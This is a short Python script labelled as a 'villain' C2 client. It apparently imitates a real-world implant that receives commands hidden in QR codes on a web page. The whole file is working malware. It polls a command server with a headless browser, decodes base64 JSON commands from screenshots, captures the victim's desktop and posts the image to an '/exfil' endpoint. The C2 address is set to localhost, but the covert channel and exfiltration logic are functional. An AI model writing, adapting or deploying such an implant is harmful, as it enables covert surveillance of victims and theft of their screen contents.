# VILLAIN: CyberRecon QR-C2 decoder client (Mandiant 2024-style)
import base64, json, time, cv2, numpy as np, requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

C2 = "http://127.0.0.1:8443"
VICTIM_ID = "v1c71m"

def init_browser():
    opts = Options()
    opts.add_argument("--headless")
    opts.add_argument("--disable-gpu")
    return webdriver.Chrome(options=opts)

def poll_commands(driver):
    while True:
        driver.get(f"{C2}/qr/{VICTIM_ID}")
        time.sleep(0.5)
        png = driver.get_screenshot_as_png()
        img = cv2.imdecode(np.frombuffer(png, np.uint8), cv2.IMREAD_COLOR)
        data, _, _ = cv2.QRCodeDetector().detectAndDecode(img)
        if data:
            cmd = json.loads(base64.b64decode(data))
            execute(cmd)
        time.sleep(5)

def execute(cmd):
    if cmd.get("cmd") == "screenshot":
        import pyautogui
        shot = pyautogui.screenshot()
        blob = base64.b64encode(shot.tobytes()).decode()
        requests.post(f"{C2}/exfil/{VICTIM_ID}", json={"type": "screenshot", "data": blob})

if __name__ == "__main__":
    poll_commands(init_browser())
